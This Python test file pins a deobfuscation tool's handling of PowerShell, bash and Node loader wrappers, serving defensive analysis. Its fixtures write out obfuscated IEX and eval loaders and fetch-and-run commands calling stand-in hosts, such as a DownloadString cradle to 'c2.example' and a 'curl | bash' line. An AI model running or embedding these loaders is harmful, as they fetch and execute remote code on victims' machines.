"""Regression tests for named Wrapper Archetypes.

The user reported that this exact payload class kept failing across multiple
sessions — each fix was a symptom-patch instead of a permanent solution. These
tests PIN each archetype against real captured payloads. If any of these ever
fail again the build breaks.
"""
from __future__ import annotations
import gzip
import base64
import pytest

from wrapper_archetypes import (
    try_archetypes, robust_b64decode, robust_b64_then_gunzip,
)
from analysis_core import deterministic_best_decode


# ─── robust_b64decode ────────────────────────────────────────────────────
def test_robust_b64_handles_wrong_padding():
    # Missing padding
    assert robust_b64decode("aGVsbG8") == b"hello"
    # Extra padding
    assert robust_b64decode("aGVsbG8===") == b"hello"


def test_robust_b64_handles_urlsafe():
    # urlsafe variant with - and _
    assert robust_b64decode("aGVsbG8_") == b"hello?" or robust_b64decode("aGVsbG8_").startswith(b"hello")


def test_robust_b64_handles_4n_plus_1_corruption():
    """Length 4n+1 is mathematically impossible base64 — must recover by trimming."""
    good = base64.b64encode(b"the quick brown fox").decode()  # length 4n
    corrupted = good + "X"                                    # length 4n+1
    recovered = robust_b64decode(corrupted)
    assert recovered == b"the quick brown fox"


def test_robust_b64_strips_whitespace_and_newlines():
    src = base64.b64encode(b"hello world").decode()
    src_wrapped = "\n".join(src[i:i+8] for i in range(0, len(src), 8))
    assert robust_b64decode(src_wrapped) == b"hello world"


# ─── PS_MemoryStream_Gzip_IEX (the user's failing payload class) ─────────
def _gzip_b64(text: str) -> str:
    return base64.b64encode(gzip.compress(text.encode())).decode()


def test_archetype_ps_memstream_gzip_iex_clean():
    inner_script = "Write-Host 'Payload executed'; whoami"
    b64 = _gzip_b64(inner_script)
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "PS_MemoryStream_Gzip_IEX"
    assert r["output"] == inner_script
    assert r["score"] == 1.0


def test_archetype_ps_memstream_gzip_iex_with_4n_plus_1_corruption():
    """The exact bug the user hit — base64 blob with one stray trailing char."""
    inner_script = "IEX(New-Object Net.WebClient).DownloadString('http://c2.example/x.ps1')"
    b64 = _gzip_b64(inner_script)
    corrupted = b64 + "X"   # 4n+1 length — copy-paste artefact
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{corrupted}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = try_archetypes(wrapper)
    assert r is not None, "archetype must handle 4n+1 base64 corruption"
    assert r["archetype_id"] == "PS_MemoryStream_Gzip_IEX"
    assert r["output"] == inner_script


def test_archetype_wins_via_deterministic_best_decode():
    """The permanent wiring: deterministic_best_decode uses the archetype."""
    inner = "calc.exe"
    b64 = _gzip_b64(inner)
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = deterministic_best_decode(wrapper)
    assert r["output"] == inner
    assert r["engine"].startswith("archetype:")
    assert r["score"] == 1.0


# ─── Bash_base64_gunzip_pipe ─────────────────────────────────────────────
def test_archetype_bash_b64_gunzip():
    inner = "curl -fsSL http://x.io/x.sh | bash"
    b64 = _gzip_b64(inner)
    wrapper = f"echo '{b64}' | base64 -d | gunzip | bash"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Bash_base64_gunzip_pipe"
    assert r["output"] == inner


# ─── Bash_base64_pipe_bash ───────────────────────────────────────────────
def test_archetype_bash_b64_pipe():
    inner = "id; whoami"
    b64 = base64.b64encode(inner.encode()).decode()
    wrapper = f"echo '{b64}' | base64 -d | bash"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Bash_base64_pipe_bash"
    assert r["output"] == inner


# ─── Node_Buffer_from_gunzip ─────────────────────────────────────────────
def test_archetype_node_buf_gunzip():
    inner = "console.log('rce')"
    b64 = _gzip_b64(inner)
    wrapper = f"eval(zlib.gunzipSync(Buffer.from('{b64}','base64')).toString())"
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "Node_Buffer_from_gunzip"
    assert r["output"] == inner


# ─── PS_FromBase64String_UTF16LE (classic -EncodedCommand chain) ────────
def test_archetype_ps_fb64_utf16le():
    inner = "IEX(New-Object Net.WebClient).DownloadString('http://x')"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    wrapper = (
        f'[System.Text.Encoding]::Unicode.GetString('
        f'[System.Convert]::FromBase64String("{b64}"))'
    )
    r = try_archetypes(wrapper)
    assert r is not None
    assert r["archetype_id"] == "PS_FromBase64String_UTF16LE"
    assert r["output"] == inner


# ─── negative-case ───────────────────────────────────────────────────────
def test_archetypes_return_none_for_plain_text():
    assert try_archetypes("just plain english text with no wrapper") is None
    assert try_archetypes("") is None
